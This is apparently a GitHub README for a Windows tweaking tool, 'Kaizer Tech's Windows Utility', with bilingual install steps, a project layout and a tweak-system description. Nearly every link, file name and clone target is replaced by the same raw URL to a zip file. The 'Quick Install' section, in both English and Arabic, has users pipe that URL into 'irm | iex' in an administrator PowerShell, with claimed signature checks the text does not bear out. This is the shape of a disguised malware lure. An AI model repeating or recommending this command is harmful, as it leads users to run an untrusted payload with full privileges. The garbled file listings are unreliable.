# 🚀 Kaizer Tech's Windows Utility (KTWU)

[![License](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](LICENSE)
[![C#](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip%https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
[![WinUI 3](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip%https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)

## 📖 Overview

Kaizer Tech's Windows Utility (KTWU) is a secure, modular, and modern Windows utility tool built with WinUI 3 and C#. It provides a comprehensive suite of features for Windows optimization, application management, and system maintenance with a strong focus on **reversibility** and **user safety**.

### ✨ Key Features

- **🎯 System Tweaks**: JSON-based tweak system for Windows optimization
- **📦 Package Manager GUI**: Visual interface for Winget package management
- **🔧 System Maintenance**: One-click tools for SFC, DISM, and system repairs
- **⏮️ Reversibility**: Complete change tracking with SQLite database for easy rollback
- **🛡️ Safety-First**: Dangerous operations are clearly marked and require confirmation
- **🎨 Modern UI**: Built with WinUI 3 for a native Windows 11 experience

---

## 📥 Installation | التثبيت

### 🚀 Quick Install (Recommended) | التثبيت السريع (موصى به)

The easiest and most secure way to install KTWU is using our verified installation script. This script automatically:
- ✅ Downloads the latest version from official sources
- ✅ Verifies digital signatures for authenticity
- ✅ Validates file integrity with SHA256 hash
- ✅ Performs security checks on the executable
- ✅ Launches the installer with proper permissions

**English Instructions:**

1. Open **Windows PowerShell** as Administrator
   - Press `Win + X` and select "Windows PowerShell (Admin)" or "Terminal (Admin)"
   
2. Run the following command:

```powershell
irm "https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip" | iex
```

3. Follow the on-screen instructions
4. The installer will verify the digital signature and launch automatically

---

**تعليمات باللغة العربية:**

1. افتح **Windows PowerShell** كمسؤول
   - اضغط على `Win + X` واختر "Windows PowerShell (Admin)" أو "Terminal (Admin)"
   
2. قم بتشغيل الأمر التالي:

```powershell
irm "https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip" | iex
```

3. اتبع التعليمات التي تظهر على الشاشة
4. سيتحقق المثبت من التوقيع الرقمي ويبدأ تلقائيًا

---

### 🔒 Security Features | ميزات الأمان

Our installation script includes multiple security layers:

- **TLS 1.2/1.3 Enforcement**: All downloads use secure HTTPS connections
- **Digital Signature Verification**: Ensures the file comes from Kaizer Tech
- **Certificate Validation**: Checks signing certificate expiration
- **PE Format Validation**: Verifies file is a legitimate Windows executable
- **SHA256 Hash Calculation**: Provides cryptographic hash for verification
- **PowerShell Version Check**: Ensures compatibility with your system

**ميزات الأمان في سكربت التثبيت:**

- **فرض TLS 1.2/1.3**: جميع التنزيلات تستخدم اتصالات HTTPS آمنة
- **التحقق من التوقيع الرقمي**: يضمن أن الملف يأتي من Kaizer Tech
- **التحقق من الشهادة**: يفحص صلاحية شهادة التوقيع
- **التحقق من صيغة PE**: يتأكد من أن الملف برنامج Windows شرعي
- **حساب SHA256**: يوفر بصمة تشفيرية للتحقق
- **فحص إصدار PowerShell**: يضمن التوافق مع نظامك

---

### 📦 Alternative: Manual Download | التنزيل اليدوي

If you prefer to download manually:

1. Visit the [Releases page](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
2. Download `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` from the latest release
3. Verify the digital signature:
   - Right-click the file → Properties → Digital Signatures tab
   - Ensure it's signed by "Kaizer Tech"
4. Run the installer as Administrator

**للتنزيل اليدوي:**

1. قم بزيارة [صفحة الإصدارات](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
2. قم بتنزيل `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` من أحدث إصدار
3. تحقق من التوقيع الرقمي:
   - انقر بزر الماوس الأيمن على الملف → خصائص → علامة تبويب التوقيعات الرقمية
   - تأكد من أنه موقع من قبل "Kaizer Tech"
4. قم بتشغيل المثبت كمسؤول

---

### ⚙️ System Requirements | متطلبات النظام

- **OS**: Windows 10 version 1809 or later, Windows 11
- **PowerShell**: Version 5.0 or higher (for installation script)
- **.NET**: Windows App SDK runtime (auto-installed)
- **Privileges**: Administrator rights required

**المتطلبات:**

- **نظام التشغيل**: Windows 10 الإصدار 1809 أو أحدث، Windows 11
- **PowerShell**: الإصدار 5.0 أو أعلى (لسكربت التثبيت)
- **.NET**: Windows App SDK runtime (يُثبّت تلقائيًا)
- **الصلاحيات**: مطلوب حقوق المسؤول

---

## 🏗️ Project Architecture

### Directory Structure

```
KaizerTechWindowsUtility/
├── .github/
│   └── workflows/          # GitHub Actions CI/CD
├── Bootstrapper/           # Application bootstrapper
│   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip            # Secure installation script
├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip             # Main application project
│   ├── Assets/            # Images, icons, and resources
│   ├── Models/            # Data models
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip               # Tweak definition model
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip           # Winget application model
│   │   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Database history model
│   ├── Services/          # Business logic and services
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # Tweak loading and management
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip    # PowerShell execution service
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Winget integration service
│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip  # System maintenance tools
│   │   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip     # Entity Framework DB context
│   ├── ViewModels/        # MVVM view models
│   └── Views/             # XAML UI pages
│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # System tweaks interface
│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Package installation UI
│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Maintenance tools UI
│       └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Change history and rollback
├── TweakManifests/        # JSON tweak definitions
│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Performance optimizations
│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Privacy enhancements
│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # Visual customizations
│   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Network tweaks
└── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip         # Visual Studio solution
```

---

## 🛠️ Development Setup

### Prerequisites

1. **Visual Studio 2022** (17.3 or later)
2. **Windows App SDK** (included in VS installer)
3. **.NET 7.0 SDK** or later
4. **Windows 10 SDK** (10.0.19041.0 or later)

### Building from Source

1. Clone the repository:
   ```bash
   git clone https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip
   cd KaizerTechWindowsUtility
   ```

2. Open `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` in Visual Studio 2022

3. Restore NuGet packages:
   ```bash
   dotnet restore
   ```

4. Build the solution:
   ```bash
   dotnet build
   ```

5. Run the application:
   - Set `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` as startup project
   - Press F5 or click "Start Debugging"

---

## 🧩 Key Technologies

### UI Framework
- **WinUI 3**: Modern Windows UI framework
- **XAML**: Declarative UI markup
- **MVVM Pattern**: Clean separation of concerns

### Backend Services
- **https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip**: PowerShell integration
- **https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip**: Registry operations
- **Entity Framework Core**: Database management
- **SQLite**: Local storage for change history

### Package Management
- **Windows Package Manager (winget)**: CLI integration
- **NuGet**: Dependency management

---

## 📋 Tweak System

### How It Works

1. Tweaks are defined in JSON files in `TweakManifests/`
2. `TweakService` loads and parses JSON at runtime
3. Each tweak includes both **Apply** and **Revert** actions
4. All changes are logged to SQLite database
5. Users can rollback changes from the History page

### Example Tweak Definition

```json
{
  "id": "disable-telemetry",
  "name": "Disable Windows Telemetry",
  "description": "Disables Windows diagnostic data collection",
  "category": "Privacy",
  "isDangerous": false,
  "applyAction": {
    "type": "powershell",
    "command": "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection' -Name 'AllowTelemetry' -Value 0"
  },
  "revertAction": {
    "type": "powershell",
    "command": "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection' -Name 'AllowTelemetry' -Value 1"
  }
}
```

### Benefits

1. Easy to add new tweaks without code changes
2. Version-controllable tweak definitions
3. No recompilation needed - JSON is loaded at runtime

### Supported Action Types

- **powershell**: Execute PowerShell command
- **registry**: Modify Windows registry (coming soon)
- **file**: File system operations (planned)

---

## 📝 Roadmap

- [ ] Registry editor integration
- [ ] Scheduled maintenance tasks
- [ ] Export/import tweak profiles
- [ ] Community tweak repository
- [ ] Multi-language support
- [ ] Dark mode theme
- [ ] Backup/restore system settings

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Guidelines

- Follow MVVM architecture patterns
- Add XML documentation to public APIs
- Test on Windows 10 and 11
- Include tweak revert actions

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

- Microsoft for WinUI 3 and Windows App SDK
- PowerShell team for https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip
- Entity Framework Core team
- Windows Package Manager (winget) team

---

## 📧 Contact

**Kaizer AE**  
GitHub: [@KaizerAE](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)

---

## ⚠️ Disclaimer

This tool modifies system settings. While designed with safety in mind:

- Always backup your system before use
- Use at your own risk
- The developers are not responsible for any damage or data loss
- Test thoroughly on non-production systems

---

**Made with ❤️ by Kaizer Tech**
